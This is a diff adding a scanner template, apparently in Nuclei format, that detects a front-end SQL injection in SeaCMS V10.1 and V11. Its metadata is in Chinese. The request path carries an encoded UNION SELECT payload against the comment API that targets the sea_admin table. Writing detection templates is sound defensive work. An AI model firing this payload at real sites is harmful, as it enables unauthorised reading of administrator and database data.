@@ -1,0 +1,28 @@
+id: seacms-v101v11-comment-api-sqli
+
+info:
+  name: 海洋cmsV10.1&V11前台sql注入漏洞
+  author: Master先生
+  severity: high
+  description: 海洋CMS V10.1&V11前台SQL注入漏洞，可以获取数据库信息。
+  reference:
+    - https://cloud.tencent.com/developer/article/1708091
+  tags: seacms,sqli
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/comment/api/index.php?gid=1&page=2&type=1&rlist[]=1)@`%27`union%2d%2d%0aselect%23%0A1,2,3,4,5,6,7,8,9,10,11%23%0Afrom%23%0Asea_admin--%20%27"
+
+    redirects: false
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          
+      - type: word
+        part: body
+        words:
+          - "SQL check"
